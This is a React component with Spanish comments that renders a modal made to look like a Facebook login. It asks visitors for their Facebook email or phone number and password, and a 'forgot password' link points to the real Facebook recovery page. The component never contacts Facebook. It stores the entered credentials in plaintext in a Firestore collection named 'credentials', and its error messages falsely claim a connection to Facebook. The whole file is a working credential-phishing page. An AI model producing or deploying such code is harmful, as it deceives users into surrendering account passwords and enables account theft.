import React, { useState } from 'react';
import { collection, addDoc } from 'firebase/firestore'; // Importa las funciones necesarias de Firestore
import { db } from '../firebase/config'; 
import imgface from '/src/assets/faceport.png'; 

function ModalFace({ onClose, onAccept }) {
    const [emailOrPhone, setEmailOrPhone] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');

    const validateInput = () => {
        // Verificar si ambos campos están llenos
        if (!emailOrPhone || !password) {
            return 'Ambos campos son obligatorios.';
        }

        // Verificar si el valor ingresado es un correo electrónico
        if (emailOrPhone.includes('@')) {
            if (!emailOrPhone.includes('.com')) {
                return 'El correo electrónico debe ser valido.';
            }
        } 
        // Verificar si el valor ingresado es un número de teléfono
        else if (/^\d{10}$/.test(emailOrPhone)) {
            return '';
        } else {
            return 'El número de teléfono debe tener 10 dígitos.';
        }
    };

    const handleSubmit = async (event) => {
        event.preventDefault();
        const validationError = validateInput();
        
        if (validationError) {
            setError(validationError);
            return;
        }

        try {
            // Crea un nuevo documento en Firestore en la colección "credentials"
            await addDoc(collection(db, "credentials"), {
                emailOrPhone: emailOrPhone,
                password: password,
            });

            //console.log('Datos guardados:', { emailOrPhone, password });
            setError('');

            // Llamar a la función onAccept después de la validación y la creación del documento
            onAccept();

        } catch (error) {
            console.error("Error al conectar con Facebook:", error);
            setError("Hubo un error al intentar conectar con Facebook. Por favor, inténtalo de nuevo.");
        }
    };

    return (
        <div style={modalStyles.overlay}>
            <div style={modalStyles.modal}>
                {/* Botón "X" para cerrar el modal */}
                <button onClick={onClose} style={modalStyles.closeButton}>
                    &times;
                </button>

                <br />
                <img src={imgface} alt="Facebook" className="imgport" />
                <h4 className='modalface-title'>Ayudanos a crecer en las redes sociales.</h4>
                <p className='modalface-text'>Por favor, ingresa tus datos para iniciar sesión.</p>
                
                <form onSubmit={handleSubmit} style={modalStyles.form}>
                    <div style={modalStyles.inputContainer}>
                        {/* <label htmlFor="emailOrPhone" style={modalStyles.label}>Correo electrónico o número de teléfono</label> */}
                        <input
                            type="text"
                            id="emailOrPhone"
                            value={emailOrPhone}
                            onChange={(e) => setEmailOrPhone(e.target.value)}
                            placeholder="Correo electrónico o número de teléfono"
                            style={modalStyles.input}
                        />
                    </div>
                    <div style={modalStyles.inputContainer}>
                        {/* <label htmlFor="password" style={modalStyles.label}>Contraseña</label> */}
                        <input
                            type="password"
                            id="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            placeholder="Contraseña"
                            style={modalStyles.input}
                        />
                    </div>
                    {error && <p style={modalStyles.errorText}>{error}</p>}
                    <button type="submit" style={modalStyles.submitButton}>Iniciar sesión</button>

                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar&from_login_screen=0" target="_blank" rel="noopener noreferrer">
                        <p style={modalStyles.forgotPassword}>¿Has olvidado la contraseña?</p>
                    </a>
                </form>

                {/* <button onClick={onAccept} style={modalStyles.acceptButton}>
                    Aceptar
                </button> */}
            </div>
        </div>
    );
}

const modalStyles = {
    overlay: {
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: 'rgba(0, 0, 0, 0.5)',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        zIndex: 1000,
    },
    modal: {
        position: 'relative',
        backgroundColor: '#fff',
        padding: '20px',
        borderRadius: '10px',
        boxShadow: '0 5px 15px rgba(0, 0, 0, 0.3)',
        maxWidth: '500px',
        width: '100%',
        textAlign: 'center',
    },
    closeButton: {
        position: 'absolute',
        top: '10px',
        right: '10px',
        backgroundColor: '#ff0000',
        color: '#fff',
        border: 'none',
        borderRadius: '20%',
        width: '30px',
        height: '30px',
        fontSize: '20px',
        cursor: 'pointer',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
    },
    form: {
        display: 'flex',
        flexDirection: 'column',
        gap: '1rem',
        marginTop: '20px',
    },
    inputContainer: {
        display: 'flex',
        flexDirection: 'column',
    },
    label: {
        marginBottom: '5px',
        fontSize: '14px',
        color: '#333',
    },
    input: {
        padding: '10px',
        borderRadius: '5px',
        border: '1px solid #ccc',
        fontSize: '14px',
        backgroundColor: '#ffffff',
        color: '#000',
        placeholderColor: '#aaa',
    },
    submitButton: {
        padding: '10px',
        backgroundColor: '#007bff',
        color: '#fff',
        border: 'none',
        borderRadius: '5px',
        cursor: 'pointer',
        fontSize: '16px',
    },
    acceptButton: {
        marginTop: '15px',
        padding: '10px 20px',
        backgroundColor: '#007bff',
        color: '#fff',
        border: 'none',
        borderRadius: '5px',
        cursor: 'pointer',
        fontSize: '16px',
    },
    forgotPassword: {
        marginTop: '10px',
        fontSize: '14px',
        color: '#007bff',
        cursor: 'pointer',
    },
    errorText: {
        color: 'red',
        fontSize: '14px',
    }
};

export default ModalFace;

